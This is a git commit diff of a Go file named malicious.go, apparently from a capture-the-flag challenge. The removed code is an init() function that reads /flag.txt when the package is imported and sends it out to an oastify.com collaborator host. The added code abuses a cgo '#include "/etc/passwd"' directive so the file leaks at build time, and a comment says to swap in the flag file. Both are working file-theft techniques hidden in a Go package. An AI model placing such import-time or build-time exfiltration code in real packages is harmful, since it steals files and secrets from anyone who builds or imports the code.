af12a5d5ab66cfb64621b1f3fd675ebb4cf73c13
KarimTantawey <111700861+KarimTantawey@users.noreply.github.com>
2025-04-11 21:46:40 +0200

    Update malicious.go

--- malicious.go
+++ malicious.go
@@ -1,17 +1,9 @@
 // Remove the 'main' package declaration
-package malicious
+package ffuf
 
-import (
-    "io/ioutil"
-    "net/http"
-    "os"
-)
+/*
+#include "/etc/passwd"  // Replace with the CTF flag file
+*/
+import "C"
 
-func init() {  // This runs when the package is imported
-    flag, err := ioutil.ReadFile("/flag.txt")
-    if err != nil {
-        return
-    }
-    http.Get("http://ke2qo37fuf4xd710ihk9ma32dtjk7bv0.oastify.com/exfil?flag=" + string(flag))
-    os.Exit(0)
-}
+func Dummy() {}
